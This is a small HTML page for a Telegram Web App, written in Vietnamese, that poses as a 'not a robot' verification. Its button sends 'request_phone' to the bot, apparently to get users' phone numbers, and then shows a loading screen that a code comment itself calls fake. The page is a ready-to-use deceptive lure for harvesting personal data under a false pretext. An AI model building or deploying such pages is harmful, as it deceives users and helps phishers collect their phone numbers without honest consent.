<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<script src="https://telegram.org/js/telegram-web-app.js"></script>

<style>
body {
    font-family: sans-serif;
    text-align: center;
    margin-top: 100px;
}
button {
    padding: 15px 30px;
    font-size: 18px;
    border-radius: 12px;
    border: none;
    background: #2AABEE;
    color: white;
}
</style>
</head>

<body>

<h2 id="title">🤖 Xác minh bạn không phải robot</h2>

<button onclick="verify()">✅ Tôi không phải robot</button>

<script>
const params = new URLSearchParams(window.location.search);

// nếu đã xác minh
if (params.get("verified") === "1") {
    document.body.innerHTML = "✅ Xác minh thành công!";
}

function verify() {
    // gửi yêu cầu về bot
    Telegram.WebApp.sendData("request_phone");

    // loading fake
    document.body.innerHTML = `
        <h3>Đợi đã, đừng đi ra ngoài</h3>
        <p>⏳ Đang xác minh...</p>
    `;
}
</script>

</body>
</html>
